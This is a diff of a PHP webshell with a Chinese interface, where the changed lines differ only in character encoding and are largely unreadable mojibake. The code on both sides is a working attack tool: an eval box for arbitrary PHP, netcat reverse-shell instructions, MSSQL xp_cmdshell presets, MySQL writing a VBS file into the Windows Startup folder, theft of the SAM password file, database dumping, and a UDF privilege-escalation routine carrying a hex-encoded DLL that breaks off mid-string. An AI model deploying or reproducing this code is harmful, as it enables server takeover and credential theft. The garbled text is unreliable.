-±¾µØÇëÔËÐÐnc³ÌÐò¼àÌý¶Ë¿Ú£¬ÀýÈçnc -vv -l -p 12666</h5><br><br><br>
-<a href="?s=dd&ty=socket"> [ Socket·´µ¯ - Windows ] </a><br><br>
-<h5>PHPÊ¹ÓÃSocket½øÐÐcmdshell·´ÏòÁ¬½Ó¡£WebshellËùÔÚ·þÎñÆ÷±ØÐëÎªWindowsÏµÍ³<br>
-Ä¿Ç°Ã»ÓÐ·¢ÏÖÓÐ·À»¤Èí¼þ»á¶ÔSocket·´ÏòÁ¬½Ó×ö³öÏÞÖÆ£¬µ«php_sockets±ØÐëÉèÖÃÎªopen/enable<br>
-ÇëÏÈÍ¨¹ýphpinfo()º¯Êý²é¿´·þÎñÆ÷ÊÇ·ñÔÊÐíphp_socketÁ¬½Ó<br>
-Socket·´ÏòÁ¬½ÓµÄÓÃÍ¾ÓÃÓÚµ±PHP½ûÓÃÁË²¿·ÖÃüÁîÖ´ÐÐº¯ÊýºóµÄÃüÁîÖ´ÐÐ<br>
-²»ÒªÃ¤Ä¿Á¬½Ó£¬·ñÔò½«Ôì³É·þÎñÆ÷¼ÙËÀ¡¢×ÊÔ´ºÄ¾¡µÈÑÏÖØºó¹û<br>
-±¾µØÇëÏÈÔËÐÐnc.exe¼àÌý¶Ë¿Ú£¬ÀýÈçnc -vv -l -p 5555<br></h5>
+<br><a href="?s=dd&ty=linux"> [ C/Perl ï¿½ï¿½ï¿½ï¿½ - Linux ] </a><br><br>
+<h5>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½linuxï¿½ï¿½È¨ï¿½ÐµÄ·ï¿½ï¿½ï¿½cmdï¿½ï¿½ï¿½Ó¡ï¿½<br>
+Ô­ï¿½ï¿½ï¿½Ç½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¹ï¿½ï¿½Üµï¿½perlï¿½Å±ï¿½ï¿½ï¿½ï¿½ï¿½Cï¿½ï¿½ï¿½ï¿½Ð´ï¿½ï¿½/tmpï¿½Ä¼ï¿½ï¿½Ð²ï¿½ï¿½ï¿½ï¿½ï¿½<br>
+ï¿½ï¿½phpï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö´ï¿½Ðºï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Üµï¿½ï¿½Â·ï¿½ï¿½ï¿½Ê§ï¿½ï¿½<br>
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ncï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ë¿Ú£ï¿½ï¿½ï¿½ï¿½ï¿½nc -vv -l -p 12666</h5><br><br><br>
+<a href="?s=dd&ty=socket"> [ Socketï¿½ï¿½ï¿½ï¿½ - Windows ] </a><br><br>
+<h5>PHPÊ¹ï¿½ï¿½Socketï¿½ï¿½ï¿½ï¿½cmdshellï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¡ï¿½Webshellï¿½ï¿½ï¿½Ú·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÎªWindowsÏµÍ³<br>
+Ä¿Ç°Ã»ï¿½Ð·ï¿½ï¿½ï¿½ï¿½Ð·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Socketï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Æ£ï¿½ï¿½ï¿½php_socketsï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îªopen/enable<br>
+ï¿½ï¿½ï¿½ï¿½Í¨ï¿½ï¿½phpinfo()ï¿½ï¿½ï¿½ï¿½ï¿½é¿´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½ï¿½ï¿½php_socketï¿½ï¿½ï¿½ï¿½<br>
+Socketï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Óµï¿½ï¿½ï¿½Í¾ï¿½ï¿½ï¿½Úµï¿½PHPï¿½ï¿½ï¿½ï¿½ï¿½Ë²ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö´ï¿½Ðºï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö´ï¿½ï¿½<br>
+ï¿½ï¿½ÒªÃ¤Ä¿ï¿½ï¿½ï¿½Ó£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½É·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô´ï¿½Ä¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Øºï¿½ï¿½ï¿½<br>
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½nc.exeï¿½ï¿½ï¿½ï¿½ï¿½Ë¿Ú£ï¿½ï¿½ï¿½ï¿½ï¿½nc -vv -l -p 5555<br></h5>
 </pre></div>
 END;
 }
 }
-//evalÖ´ÐÐphp´úÂë
+//evalÖ´ï¿½ï¿½phpï¿½ï¿½ï¿½ï¿½
 function phpcode()
 {
 print<<<END
-<div class="actall"><h5>ÊäÈëphp´úÂë:<h5></div>
+<div class="actall"><h5>ï¿½ï¿½ï¿½ï¿½phpï¿½ï¿½ï¿½ï¿½:<h5></div>
 <form action="?s=ff" method="POST">
 <div class="actall"><textarea name="phpcode" rows="20" cols="80">phpinfo();/*print_r(apache_get_modules());*/</textarea></div><br />
-<div><input class="bt" type="submit" value="EVALÖ´ÐÐ"></div><br></form>
+<div><input class="bt" type="submit" value="EVALÖ´ï¿½ï¿½"></div><br></form>
 END;
 $phpcode = $_POST['phpcode'];
 $phpcode = trim($phpcode);
@@ -1086,7 +1086,7 @@ echo '<br><br>';
 }
 return false;
 }
-//ÆäËüÊý¾Ý¿âÁ¬½Ó
+//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½ï¿½
 function otherdb(){
 $db = isset($_GET['db']) ? $_GET['db'] : 'ms';
 print<<<END
@@ -1135,16 +1135,16 @@ function msFull(i){
 </script>
 <textarea name="mssql" style="width:600px;height:200px;">{$msquery}</textarea><br>
 <select onchange="return msFull(options[selectedIndex].value)">
-	<option value="0" selected>Ö´ÐÐÃüÁî</option>
-	<option value="1">ÏÔÊ¾°æ±¾</option>
-	<option value="2">Êý¾Ý¿â</option>
-	<option value="3">±í¶Î</option>
-	<option value="4">×Ö¶Î</option>
+	<option value="0" selected>Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="1">ï¿½ï¿½Ê¾ï¿½æ±¾</option>
+	<option value="2">ï¿½ï¿½ï¿½Ý¿ï¿½</option>
+	<option value="3">ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="4">ï¿½Ö¶ï¿½</option>
 	<option value="5">sp_oacreate</option>
 	<option value="6">xp_cmdshell</option>
 	<option value="7">xp_cmdshell(2005)</option>
 	<option value="8">sp_oacreate(2005)</option>
-	<option value="9">´ò¿ªopenrowset(2005)</option>
+	<option value="9">ï¿½ï¿½ï¿½ï¿½openrowset(2005)</option>
 	<option value="10">xp_cmdshell exec</option>
 	<option value="10">sp_oamethod exec</option>
 	<option value="11">sp_makewebtask</option>
@@ -1153,7 +1153,7 @@ function msFull(i){
 <input class="bt" type="submit" value="Query"></form></div>
 END;
 if ($msaction == 'msquery'){
-$msconn= mssql_connect ($mshost , $msuser, $mspass);  
+$msconn= mssql_connect ($mshost , $msuser, $mspass);
 mssql_select_db($msdbname,$msconn) or die("connect error :" .mssql_get_last_message());
 $msresult = mssql_query($msquery) or die(mssql_get_last_message());
 echo '<font face="verdana"><table border="1" cellpadding="1" cellspacing="2">'."\n<tr>\n";
@@ -1193,7 +1193,7 @@ SID:<input type="text" name="orasid" value="{$orasid}" style="width:50px"><br>
 <script language="javascript">
 function oraFull(i){
 Str = new Array(5);
-	Str[0] = ""; 
+	Str[0] = "";
 	Str[1] = "select version();";
 	Str[2] = "SELECT NAME FROM V$DATABASE";
 	Str[3] = "select * From all_objects where object_type='TABLE'";
@@ -1204,17 +1204,17 @@ Str = new Array(5);
 </script>
 <textarea name="orasql" style="width:600px;height:200px;">{$oraquery}</textarea><br>
 <select onchange="return oraFull(options[selectedIndex].value)">
-	<option value="0" selected>Ö´ÐÐÃüÁî</option>
-	<option value="1">ÏÔÊ¾°æ±¾</option>
-	<option value="2">Êý¾Ý¿â</option>
-	<option value="3">±í¶Î</option>
-	<option value="4">×Ö¶Î</option>
+	<option value="0" selected>Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="1">ï¿½ï¿½Ê¾ï¿½æ±¾</option>
+	<option value="2">ï¿½ï¿½ï¿½Ý¿ï¿½</option>
+	<option value="3">ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="4">ï¿½Ö¶ï¿½</option>
 </select>
 <input type="hidden" name="action" value="myquery">
 <input class="bt" type="submit" value="Query"></div></form>
 END;
 if($oraaction == 'oraquery'){
-$oralink=OCILogon($orauser,$orapass,"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=$orasid)))") or die(ocierror()); 
+$oralink=OCILogon($orauser,$orapass,"(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST=$orahost)(PORT = $oraport))(CONNECT_DATA =(SID=$orasid)))") or die(ocierror());
 $oraresult=ociparse($oralink,$oraquery) or die(ocierror());
 $orarow=oci_fetch_row($oraresult);
 echo '<font face="verdana"><table border="1" cellpadding="1" cellspacing="2">'."\n<tr>\n";
@@ -1261,11 +1261,11 @@ Str = new Array(11);
 </script>
 <textarea name="ifxsql" style="width:600px;height:200px;">{$ifxquery}</textarea><br>
 <select onchange="return ifxFull(options[selectedIndex].value)">
-	<option value="0" selected>Ö´ÐÐÃüÁî</option>
-	<option value="1">Êý¾Ý¿â·þÎñÆ÷Ãû³Æ</option>
-	<option value="1">Êý¾Ý¿â</option>
-	<option value="2">±í¶Î</option>
-	<option value="3">×Ö¶Î</option>
+	<option value="0" selected>Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="1">ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="1">ï¿½ï¿½ï¿½Ý¿ï¿½</option>
+	<option value="2">ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="3">ï¿½Ö¶ï¿½</option>
 	<option value="4">hashes</option>
 </select>
 <input type="hidden" name="action" value="ifxquery">
@@ -1322,11 +1322,11 @@ return true;
 </script>
 <textarea name="db2sql" style="width:600px;height:200px;">{$db2query}</textarea><br>
 <select onchange="return db2Full(options[selectedIndex].value)">
-	<option value="0" selected>Ö´ÐÐÃüÁî</option>
-	<option value="1">Êý¾Ý¿â</option>
-	<option value="1">±í¶Î</option>
-	<option value="2">×Ö¶Î</option>
-	<option value="3">Êý¾Ý¿âÅäÖÃ</option>
+	<option value="0" selected>Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="1">ï¿½ï¿½ï¿½Ý¿ï¿½</option>
+	<option value="1">ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="2">ï¿½Ö¶ï¿½</option>
+	<option value="3">ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½ï¿½</option>
 </select>
 <input type="hidden" name="action" value="db2query">
 <input class="bt" type="submit" value="Query"></div></form>
@@ -1380,10 +1380,10 @@ return true;
 </script>
 <textarea name="fbsql" style="width:600px;height:200px;">{$fbquery}</textarea><br>
 <select onchange="return fbFull(options[selectedIndex].value)">
-	<option value="0" selected>Ö´ÐÐÃüÁî</option>
-	<option value="1">±í¶Î</option>
-	<option value="2">×Ö¶Î</option>
-	<option value="3">Ìí¼Ósql</option>
+	<option value="0" selected>Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="1">ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="2">ï¿½Ö¶ï¿½</option>
+	<option value="3">ï¿½ï¿½ï¿½ï¿½sql</option>
 	<option value="4">shell</option>
 </select>
 <input type="hidden" name="action" value="fbquery">
@@ -1410,7 +1410,7 @@ ibase_close();
 }
 }
 }
-//MySqlÖ´ÐÐ
+//MySqlÖ´ï¿½ï¿½
 function Mysql_n()
 {
 	$MSG_BOX = '';
@@ -1419,7 +1419,7 @@ function Mysql_n()
 	{
 		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
 		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
-		else $MSG_BOX = 'Á¬½ÓMYSQLÊ§°Ü';
+		else $MSG_BOX = 'ï¿½ï¿½ï¿½ï¿½MYSQLÊ§ï¿½ï¿½';
 	}
 	$downfile = 'c:/windows/repair/sam';
 	if(!empty($_POST['downfile']))
@@ -1441,29 +1441,29 @@ function Mysql_n()
 			echo $downcode;
 			exit;
 		}
-		else $MSG_BOX = 'ÏÂÔØÎÄ¼þÊ§°Ü';
+		else $MSG_BOX = 'ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½ï¿½';
 	}
 	$o = isset($_GET['o']) ? $_GET['o'] : '';
 	Root_CSS();
 print<<<END
 <form method="POST" name="nform" id="nform" action="?s=n&o={$o}" enctype="multipart/form-data">
-<center><div class="actall"><a href="?s=n">[MYSQLÖ´ÐÐÓï¾ä]</a>
-<a href="?s=n&o=tq">[MYSQLÌáÈ¨]</a>
-<a href="?s=n&o=tk">[MYSQLÍÑ¿â±¸·Ý]</a>
-<a href="?s=n&o=u">[MYSQLÉÏ´«ÎÄ¼þ]</a>
-<a href="?s=n&o=d">[MYSQLÏÂÔØÎÄ¼þ]</a></div>
+<center><div class="actall"><a href="?s=n">[MYSQLÖ´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½]</a>
+<a href="?s=n&o=tq">[MYSQLï¿½ï¿½È¨]</a>
+<a href="?s=n&o=tk">[MYSQLï¿½Ñ¿â±¸ï¿½ï¿½]</a>
+<a href="?s=n&o=u">[MYSQLï¿½Ï´ï¿½ï¿½Ä¼ï¿½]</a>
+<a href="?s=n&o=d">[MYSQLï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½]</a></div>
 <div class="actall">
-µØÖ· <input type="text" name="mhost" value="{$mhost}" style="width:110px">
-¶Ë¿Ú <input type="text" name="mport" value="{$mport}" style="width:110px">
-ÓÃ»§ <input type="text" name="muser" value="{$muser}" style="width:110px">
-ÃÜÂë <input type="text" name="mpass" value="{$mpass}" style="width:110px">
-¿âÃû <input type="text" name="mdata" value="{$mdata}" style="width:110px">
+ï¿½ï¿½Ö· <input type="text" name="mhost" value="{$mhost}" style="width:110px">
+ï¿½Ë¿ï¿½ <input type="text" name="mport" value="{$mport}" style="width:110px">
+ï¿½Ã»ï¿½ <input type="text" name="muser" value="{$muser}" style="width:110px">
+ï¿½ï¿½ï¿½ï¿½ <input type="text" name="mpass" value="{$mpass}" style="width:110px">
+ï¿½ï¿½ï¿½ï¿½ <input type="text" name="mdata" value="{$mdata}" style="width:110px">
 </div>
 <div class="actall" style="height:220px;">
 END;
 if($o=='u')
 {
-	$uppath = 'C:/Documents and Settings/All Users/¡¸¿ªÊ¼¡¹²Ëµ¥/³ÌÐò/Æô¶¯/exp.vbs';
+	$uppath = 'C:/Documents and Settings/All Users/ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½Ëµï¿½/ï¿½ï¿½ï¿½ï¿½/ï¿½ï¿½ï¿½ï¿½/exp.vbs';
 	if(!empty($_POST['uppath']))
 	{
 		$uppath = $_POST['uppath'];
@@ -1476,24 +1476,24 @@ if($o=='u')
 			if(@mysql_query($query,$conn))
 			{
 				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
-				$MSG_BOX = @mysql_query($query,$conn) ? 'ÉÏ´«ÎÄ¼þ³É¹¦' : 'ÉÏ´«ÎÄ¼þÊ§°Ü';
+				$MSG_BOX = @mysql_query($query,$conn) ? 'ï¿½Ï´ï¿½ï¿½Ä¼ï¿½ï¿½É¹ï¿½' : 'ï¿½Ï´ï¿½ï¿½Ä¼ï¿½Ê§ï¿½ï¿½';
 			}
-			else $MSG_BOX = '²åÈëÁÙÊ±±íÊ§°Ü';
+			else $MSG_BOX = 'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½Ê§ï¿½ï¿½';
 			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
 		}
-		else $MSG_BOX = '´´½¨ÁÙÊ±±íÊ§°Ü';
+		else $MSG_BOX = 'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½Ê§ï¿½ï¿½';
 	}
 print<<<END
-<br><br>ÉÏ´«Â·¾¶ <input type="text" name="uppath" value="{$uppath}" style="width:500px">
-<br><br>Ñ¡ÔñÎÄ¼þ <input type="file" name="upfile" style="width:500px;height:22px;">
-</div><div class="actall"><input type="submit" value="ÉÏ´«" style="width:80px;">
+<br><br>ï¿½Ï´ï¿½Â·ï¿½ï¿½ <input type="text" name="uppath" value="{$uppath}" style="width:500px">
+<br><br>Ñ¡ï¿½ï¿½ï¿½Ä¼ï¿½ <input type="file" name="upfile" style="width:500px;height:22px;">
+</div><div class="actall"><input type="submit" value="ï¿½Ï´ï¿½" style="width:80px;">
 END;
 }
 elseif($o=='d')
 {
 print<<<END
-<br><br><br>ÏÂÔØÎÄ¼þ <input type="text" name="downfile" value="{$downfile}" style="width:500px">
-</div><div class="actall"><input type="submit" value="ÏÂÔØ" style="width:80px;">
+<br><br><br>ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ <input type="text" name="downfile" value="{$downfile}" style="width:500px">
+</div><div class="actall"><input type="submit" value="ï¿½ï¿½ï¿½ï¿½" style="width:80px;">
 END;
 }elseif($o=='tk'){
 if($_POST['dump']=='dump'){
@@ -1512,7 +1512,7 @@ while($t=mysql_fetch_array($q1)){
     {
     $keys=array_keys($data);
     $keys=array_map('addslashes',$keys);
-    $keys=join('`,`',$keys);    
+    $keys=join('`,`',$keys);
     $keys="`".$keys."`";
     $vals=array_values($data);
     $vals=array_map('addslashes',$vals);
@@ -1526,14 +1526,14 @@ $filename=date("Y-m-d-GisA").".sql";
 $fp=fopen($filename,'w');
 fputs($fp,$mysql);
 fclose($fp);
-$tip="<br><center>Êý¾Ý±¸·Ý³É¹¦£¬µã»÷ÏÂÔØÊý¾Ý¿âÎÄ¼þ£º[<a href=\"".$filename."\" title=\"µã»÷ÏÂÔØ\">".$filename."</a>]</center>";
-}else{$tip="ÉÐÎ´±¸·Ý£¬±£Ö¤±¾³ÌÐòËùÔÚÄ¿Â¼¿ÉÐ´";}
+$tip="<br><center>ï¿½ï¿½ï¿½Ý±ï¿½ï¿½Ý³É¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½[<a href=\"".$filename."\" title=\"ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\">".$filename."</a>]</center>";
+}else{$tip="ï¿½ï¿½Î´ï¿½ï¿½ï¿½Ý£ï¿½ï¿½ï¿½Ö¤ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½Ð´";}
 print<<<END
 <div class="actall"><form method="post" action="?s=n&o=tk"><br>
-ÇëÉ÷ÓÃ±¾¹¦ÄÜ£¬Êý¾Ý¿â¹ý´ó½«Ôì³É·þÎñÆ÷å´»úµÈÇé¿ö :-(<br><br>
+ï¿½ï¿½ï¿½ï¿½ï¿½Ã±ï¿½ï¿½ï¿½ï¿½Ü£ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½É·ï¿½ï¿½ï¿½ï¿½ï¿½å´»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ :-(<br><br>
 {$tip}<br><br>
 <input type="hidden" value="dump" name="dump" id="dump">
-<input type="submit" value="Ò»¼ü±¸·Ý" tilte="Submit" style="width:120px;height:64px;">
+<input type="submit" value="Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½" tilte="Submit" style="width:120px;height:64px;">
 </form><div>
 END;
 }elseif($o=='tq')
@@ -1547,7 +1547,7 @@ if($install){
 	@mysql_query("DROP TABLE udf_temp", $link);
 	$query="CREATE TABLE udf_temp (udf BLOB);";
 if(!($result=mysql_query($query, $link)))
-die('´´½¨ÁÙÊ±±íÊ§°Ü'.mysql_error());
+die('ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½Ê§ï¿½ï¿½'.mysql_error());
 else
 {
 $code="0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E00000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000009BBB9A02DFDAF451DFDAF451DFDAF451A4C6F851DDDAF4515CC6FA51CBDAF45137C5FE518BDAF451DFDAF451DCDAF451BDC5E751DADAF451DFDAF55184DAF45137C5FF51DCDAF45137C5F051DEDAF45152696368DFDAF4510000000000000000504500004C010300B2976A460000000000000000E0000E210B01060000500000001000000090000010E6000000A0000000F000000000001000100000000200000400000000000000040000000000000000000100001000000000000002000000000010000010000000001000001000000000000010000000D8F000007400000000F00000D80000000000000000000000000000000000000000000000000000004CF100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000900000001000000000000000040000000000000000000000000000800000E055505831000000000050000000A000000048000000040000000000000000000000000000400000E055505832000000000010000000F0000000020000004C0000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000322E303200555058210D09020A459475C59FCC587632C900000F46000000B00000260A00BC6FEDDDFF558BEC6AFF6800007148040ED064A10507506489FFD8FF9F2583EC0C5356578965E8C745FC0F7D0C0175236A00FFEDB77B012E05B008FF150970008945E4EB09B81E7363BB0124C38B2FFF000F8B4DF05FF6FFD94E0D5F5E5B8BE55DC20C0090008B442499ACFDF604C740081C100432C0C30F8F58FDAC7D0081EC8C090592C685E8FBFF77DFBD6100B9FF1733C08DBDE90DF3AB66ABAA33DB895DFC8B33DBBBFF450C8338010F85770380480439190A6C53EFFEFFBF80988B50088B0250E80A005DDC83C40885C00F84511A889DC8F6F720276B414EC9F6C785BC0A9FD9DC5D0C16899DC0090FC4D853A1FBF6DF8D8D1A518D95CCFA06528D85B80D500EB399661B2C256C44246CCDF7EFB116288B852A8985ACF605A866EEEE8C6C559C985668050134776723CD95C852240CBFBA8883C9DFDCFFB7FF9CF2AEF7D12BF98BF78BFA8BD1100E4F8BCAC1B3CDFDF6E902F3A50683E103F3A4FBF2083566B604D88B393284B4C1B5DB60E6D8FBB153006A0103FF6B63838A538B20B4283BC3752D6A0A6D84436EF0E8FB1C4F473ADBAF3D7C12516670380B52E917059E0B67B30CF72A18B9D0FA40FB0E72106AD1FA6803FA8D1D93CBD8D84268FF14D0FAC47E0990583A548D64D9BA6F3EE5117E8BF089B564B9535EC803C2993B046AA18BB810CD2ED81B0E567420C63C10FFB9E53B72C6000163E8EBBA1882FBB7B9850436D41105B0596A206A03049D306B6E037D7EB2BF0CF6B171F37B6883FEFF6A85385618DCEFEF2D94F889BD408D4764A80FF652F1DC2F942DB9590C89036A9D5679F8CFBE564F01515030108B13C6043A0009446C03E40BD18B3BD9687E2C089318580C04EB366A64B66C8DC972D031745813594ECE0E53C16551C83BE920FDC91E498B5514890AE98B03E63F61EE23C368C80B6389500C3BD37C2939D8751A3233C07F3001BB709155357A0C83910DBB954511420C8651C8D391AC91AE8D513763F24C9552CDB0069B6CC2A4E96551C51C8B6C76695D530C1FA86CB243C27B0C298B5BA5C3A71B4F08A40F8B400C8674DD5B768C07BC91591B00130BC8AEF1B72C1D750683C8FFC2C30E05DCC030D74E060C74092FF202EDB4329054554468020217F6FEBFFE7134F7D81BC04081C41A5E903D814C060F6808B8640426B073A466121C866DCBB6417B885DA87401A902ADB17EE3D2B76603B58845B71684FEF1888590FFFE7D72BB06563F84BD910AE983CF3F4F9B2E347D942C6A02227175943B5A018CEDF7751616FC1708EC3F79044888FEFE71103BC7751D560A1BC60B6C14326A107A8D74235F61B8E73A52180F66DB8D2C2C88980B531CAE9A338FCA02DD827A1D0E203DB8C9B537DC9004B9827E8B3089CAB4D6D37CB01D80B471D337110CE748BEDDEC6F6A081AA8D177E6489E04A0B6138D55A8E327325A00438D7DA883CE2D656B0763CE457537E59B512FD8B7C1028B8B8596504522D9BE1B6144418D4DA885C977DD1696139C2E06249C238D472834160750D28954283B70800CF2C67526537547C84B6CC025CF070D048CFFFEDF5EBC8549E4200866E4516A28AE11DB6E61BC52F88D2072229D489AB3985D2C1D8B35781C88D11B302A6C37DF5968311659FFFF1151BE82B96D42D6FC84FED51052D985CD06A5091CEBC5BA94506052022C069E0F3981C511788FA404FCF68450228B75087CC0807E09060A4B775B71A85F8B5E0C20D469D9D115CEF92011C8B80D124CB6177EA98AB6E00FC1E0028BC803C604C468141ADF02CC33C98A7DBFB566FBEF5E4CC1E102058D14018955E0803A4D4F586F8F818BB9AA01CC8BF2E266F3A7ED0CF26C164102C0159D0542D875477205B04C2C3908C10D00DA6E0D67EF1968D007001034E90B8795BC59C82DED1533F607B80774C03FFB9009C183C206298A023C2167DF7FE9743C843B1B3C0A741788843530421B46D889846744EBDB7FB907CABBFF6F29B6B53C33D2F3A6753B88954C0BB918D962C860784DB34C76739038C0B10B6C68E803C59378271EEB254A1D8E236534B0301BB135728144C60F4F9400D7493C77C7030B5E382E81D8BB7F1A837C2410027513060405750C5B6464046B5F23C357084F179213C888140525F1ECA263810C5456C9134CD8C9C22CBD4FE485DBCEE499566BF6CFE0FA8BCB2BCE490C0804904BB80768042700E0FE397221F724434558E0FE8108D87B96002F8BFB1B2A2327837CD98BFACBCB5073BCC8855098E0FE8D6FBFAC03B7B10DCC63DC0DAF234B21D18DC47AF02AFA7A568F638FA2C0EB0C0354AD46F2C505EED48821B01A60A081C4112684C3CFF4425689FF3B77D77857040CB911280D108D7C2418F3AB8D4C243B0D069B6C1451AB343101BA0B041B0111E5724E64F06650720D553D8755FD04BA917466380E6E8D542408D731F62D925266181108435C5C8F4F4A761850514F9481106A5CDFBFEACC4044076C1589B424809674C67652DD247C03788C5FB65E56B87B49BCBFF0FF255B3CCCCC8D87D4E1674755E7F0FF42DF86C00D5F613C5D6C7904F74104868B23B8065423740F795CEFDCD7B7A5108902B863C33E1210506AFE5C908E7F40F864FF35A900198E1AB52529582FDDD5B4BFC0ED742E3B932474FA34768B0CB38959BD2DB50A02C304B394751268F7DBBFEDBD2DB37D0EAAFF5408EBC3648F0543236C7286EA8C1A648B9C8184FF83DF7904687510E3520C3951087505CF4D05BBFB5351BB1E18EB0A082489DFDCB7B64B02439D6B0C595BFCEF56433230069F0BF758433030F7A5FAFCD82C10DBD10C74F740E42682B58DD63E3F45F812E11B8D08B67F97AD3E21737B08C1618D0C76B18FEA6EED5F744556558D6B10A80B5D5E410B33BBE85ED633783C25534F0DD41D2B38D3AF560C0E168D36B7DEDDB6C5648F358F550C3B08C77EBF73301A8B348FEBA1B8DBEB1CC9EB15884DD67A5C003F5D16466F684394BC3B8B298B419FCC256BB4031824E1D763D9B66E20CF56BDE8C0E010E24785ED75EC423C0AE0DD5B0D1A7E4DE47F34168D5AFF3ADD766B1B92784D1C8020770D2450EDC3FF4884157559598BC65EC9C3CF8DDCFAF7D7B26B71151008C3B7E0772212C7424B4F0434A759913916BDF01C6C7410131E97DEB2C3568BB5FB05D7383B42565777216A091C1FF8ECA245FBA424020C91EF2059E1DB46ED38CEC7FD85F675032863FCDA7F5E83C60F83E6F056887CA4BCC65CE23B3A6BFC4D5716F6460C4074ECEFB75D15660CB2174D29730510B35652F790357329C54E308374342411FAFEE42B502AF7FF761007176F9B34F5DD7D0525EB128B461C530B5FD2A4D87B1C0059644B2A20B25628752EE34A467A86B386F62C591AE1D81E2DFA85EFFD0A7C092CE61D90280DE157F8ED397D08470F94C0485BC31630077AC31A6E5DF1025B5756391803BA23977D6097CA146A401A0CB8CDDCF7039B4DB4DD40743DFD6E78405720AC597B741356C220D7843337E11962410B5957B4C5DA2E6018CC07835328D00CBC3010E326ABA73DB884FB1147D903CB8BFEEA5A8A4614B8F01759C93A47FF7704A94949608563EF1B385B5E